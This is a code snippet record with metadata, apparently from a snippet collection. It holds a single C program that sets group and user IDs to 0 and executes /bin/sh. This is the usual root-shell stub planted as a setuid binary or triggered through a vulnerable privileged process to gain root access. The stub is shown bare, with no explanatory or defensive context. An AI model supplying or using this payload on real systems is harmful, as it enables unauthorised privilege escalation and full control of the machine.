---
id: 3762e5ff-de43-44d1-8f94-5c557480c046
type: code
language: C
verified: false
created_at: '2019-09-17T20:08:40.302501+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 3762e5ff

**Language**: C

```c
int main(void) {setgid(0); setuid(0);execl("/bin/sh","sh",0);return 0;}
```
